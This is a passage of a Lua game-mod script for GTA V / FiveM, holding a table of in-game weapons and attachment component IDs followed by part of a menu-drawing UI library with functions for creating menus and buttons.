				{name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		} },
		CarbineRifle = { id = "weapon_carbinerifle", name="Carbine Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_CARBINERIFLE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_CARBINERIFLE_CLIP_02"},
				{ name = "Box Magazine", id="COMPONENT_CARBINERIFLE_CLIP_03"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		CarbineRifleMkII = { id = "weapon_carbinerifle_mk2", name="Carbine Rifle Mk II ", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
				{ name = "Tracer Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
				{ name = "Incendiary Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "Hollow Point Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{ name = "Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_CR_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_CR_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		
		} },
		AdvancedRifle = { id = "weapon_advancedrifle", name="Advanced Rifle ", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_ADVANCEDRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},		
		} },
		SpecialCarbine = { id = "weapon_specialcarbine", name="Special Carbine", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_02"},
				{ name = "Drum Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_03"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		SpecialCarbineMkII = { id = "weapon_specialcarbine_mk2", name="Special Carbine Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
				{ name = "Tracer Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
				{ name = "Incendiary Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
				{ name = "Hollow Point Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{ name = "Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_SC_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_SC_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
				{ name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
		
		} },
		BullpupRifle = { id = "weapon_bullpuprifle", name="Bullpup Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_BULLPUPRIFLE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_BULLPUPRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		BullpupRifleMkII = { id = "weapon_bullpuprifle_mk2", name="Bullpup Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
				{ name = "Tracer Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
				{ name = "Incendiary Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "Armor Piercing Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "Small Scope", id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},
				{ name = "Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_BP_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_BP_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		CompactRifle = { id = "weapon_compactrifle", name="Compact Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_02"},
				{ name = "Drum Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_03"},
			},
		} },	
	},
	LMGS = {	
		MG = { id = "weapon_mg", name="MG", bInfAmmo = false, mods = {					
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_MG_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_MG_CLIP_02"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_SMALL_02"},			
			},
		} },
		CombatMG = { id = "weapon_combatmg", name="Combat MG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_COMBATMG_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_COMBATMG_CLIP_02"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		CombatMGMkII = { id = "weapon_combatmg_mk2", name="Combat MG Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_COMBATMG_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_COMBATMG_MK2_CLIP_02"},
				{ name = "Tracer Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
				{ name = "Incendiary Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
				{ name = "Hollow Point Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
				{ name = "Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_MG_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_MG_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		
		} },
		GusenbergSweeper = { id = "weapon_gusenberg", name="GusenbergSweeper", bInfAmmo = false, mods = {			
		Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_GUSENBERG_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_GUSENBERG_CLIP_02"},
			},
		} },
	},
	Snipers = {	
		SniperRifle = { id = "weapon_sniperrifle", name="Sniper Rifle", bInfAmmo = false, mods = {
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_LARGE"},	
				{ name = "Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},			
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
		
		} },
		HeavySniper = { id = "weapon_heavysniper", name="Heavy Sniper", bInfAmmo = false, mods = {			
		Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_LARGE"},	
				{ name = "Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},			
			},
		} },
		HeavySniperMkII = { id = "weapon_heavysniper_mk2", name="Heavy Sniper Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
				{ name = "Incendiary Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
				{ name = "Armor Piercing Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},		
				{ name = "Explosive Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"},
			},
			Sights =
			{
				{ name = "Zoom Scope", id="COMPONENT_AT_SCOPE_LARGE_MK2"},
				{ name = "Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},
				{ name = "Nigt Vision Scope", id="COMPONENT_AT_SCOPE_NV"},
				{ name = "Thermal Scope", id="COMPONENT_AT_SCOPE_THERMAL"},
			},	
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_SR_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_SR_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Suppressor", id="COMPONENT_AT_SR_SUPP_03"},
				{ name = "Squared Muzzle Brake", id="COMPONENT_AT_MUZZLE_08"},
				{ name = "Bell-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_09"},
			},
		} },
		MarksmanRifle = { id = "weapon_marksmanrifle", name="Marksman Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "Default Magazine", id="COMPONENT_MARKSMANRIFLE_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_MARKSMANRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "Scope", id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"},			
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		
		} },
		MarksmanRifleMkII = { id = "weapon_marksmanrifle_mk2", name="Marksman Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "Default Magazine", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
				{ name = "Extended Magazine", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
				{ name = "Tracer Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
				{ name = "Incendiary Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "Hollow Point Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "FMJ Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"},		
			},
			Sights =
			{
				{ name = "Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
				{ name = "Zoom Scope", id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"},
			},
			Flashlight = 
			{
				{ name = "Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "Default", id="COMPONENT_AT_MRFL_BARREL_01"},	
				{ name = "Heavy", id="COMPONENT_AT_MRFL_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
		} },
	
	},
	HeavyWeapons = {
		RPG = { id = "weapon_rpg", name="RPG", bInfAmmo = false, mods = {} },
		GrenadeLauncher = { id = "weapon_grenadelauncher", name="Grenade Launcher", bInfAmmo = false, mods = {} },
		GrenadeLauncherSmoke = { id = "weapon_grenadelauncher_smoke", name="Grenade Launcher Smoke", bInfAmmo = false, mods = {} },
		Minigun = { id = "weapon_minigun", name="Minigun", bInfAmmo = false, mods = {} },
		FireworkLauncher = { id = "weapon_firework", name="Firework Launcher", bInfAmmo = false, mods = {} },
		Railgun = { id = "weapon_railgun", name="Railgun", bInfAmmo = false, mods = {} },
		HomingLauncher = { id = "weapon_hominglauncher", name="Homing Launcher", bInfAmmo = false, mods = {} },
		CompactGrenadeLauncher = { id = "weapon_compactlauncher", name="Compact Grenade Launcher", bInfAmmo = false, mods = {} },
		Widowmaker = { id = "weapon_rayminigun", name="Widowmaker", bInfAmmo = false, mods = {} },
	
	},
	Throwables = {
		Grenade = { id = "weapon_grenade", name="Grenade", bInfAmmo = false, mods = {} },
		BZGas = { id = "weapon_bzgas", name="BZ Gas", bInfAmmo = false, mods = {} },
		MolotovCocktail = { id = "weapon_molotov", name="Molotov Cocktail", bInfAmmo = false, mods = {} },
		StickyBomb = { id = "weapon_stickybomb", name="Sticky Bomb", bInfAmmo = false, mods = {} },
		ProximityMines = { id = "weapon_proxmine", name="Proximity Mines", bInfAmmo = false, mods = {} },
		Snowballs = { id = "weapon_snowball", name="Snowballs", bInfAmmo = false, mods = {} },
		PipeBombs = { id = "weapon_pipebomb", name="Pipe Bombs", bInfAmmo = false, mods = {} },
		Baseball = { id = "weapon_ball", name="Baseball", bInfAmmo = false, mods = {} },
		TearGas = { id = "weapon_smokegrenade", name="Tear Gas", bInfAmmo = false, mods = {} },
		Flare = { id = "weapon_flare", name="Flare", bInfAmmo = false, mods = {} },
	
	},
	Misc = {	
		JerryCan = { id = "weapon_petrolcan", name="Jerry Can", bInfAmmo = false, mods = {} },
		Parachute = { id = "gadget_parachute", name="Parachute", bInfAmmo = false, mods = {} },
		FireExtinguisher = { id = "weapon_fireextinguisher", name="Fire Extinguisher", bInfAmmo = false, mods = {} },	
	}
}





Menu = { }

Menu.debug = false


local menus = { }
local keys = { up = 172, down = 173, left = 174, right = 175, select = 176, back = 177 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005


local function debugPrint(text)
	if Menu.debug then
		Citizen.Trace('[Menu] '..tostring(text))
	end
end


local function debugLog(text)
		Citizen.Trace('[meme] '..tostring(text))
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
	end
end


local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end


local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, 'visible', visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end

	Citizen.InvokeNative(0x25FBB336DF1804CB , "STRING")
	Citizen.InvokeNative(0x6C188BE134E074AA, text)
	Citizen.InvokeNative(0xCD015E5BB0D96A57, x, y)
end


local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
		else
			drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
	end
end


local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }

		drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
		end
	end
end


local function drawButton(text, subText)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

		if subText then
			drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
		end
	end
end


function Menu.CreateMenu(id, title)
	-- Default settings
	menus[id] = { }
	menus[id].title = title
	menus[id].subTitle = 'INTERACTION MENU'

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.0175
	menus[id].y = 0.025
	menus[id].width = 0.23

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10

	menus[id].titleFont = 1
	menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundColor = { r = 245, g = 127, b = 23, a = 255 }
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
	menus[id].menuSubTextColor = { r = 189, g = 189, b = 189, a = 255 }
	menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

	menus[id].subTitleBackgroundColor = { r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255 }

	menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id)..' menu created')
end


function Menu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		Menu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, 'subTitle', string.upper(subTitle))
		else
			setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, 'previousMenu', parent)

		setMenuProperty(id, 'x', menus[parent].x)
		setMenuProperty(id, 'y', menus[parent].y)
		setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
		setMenuProperty(id, 'titleFont', menus[parent].titleFont)
		setMenuProperty(id, 'titleColor', menus[parent].titleColor)
		setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
		setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
		setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
		setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
		setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
		setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
		setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
	else
		debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
	end
end


function Menu.CurrentMenu()
	return currentMenu
end


function Menu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)
		debugPrint(tostring(id)..' menu opened')
	else
		debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
	end
end


function Menu.IsMenuOpened(id)
	return isMenuVisible(id)
end


function Menu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then return true end
	end

	return false
end


function Menu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end


function Menu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu)..' menu closed')
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu)..' menu about to be closed')
		end
	end
end


function Menu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end


function Menu.MenuButton(text, id)
	if menus[id] then
		if Menu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
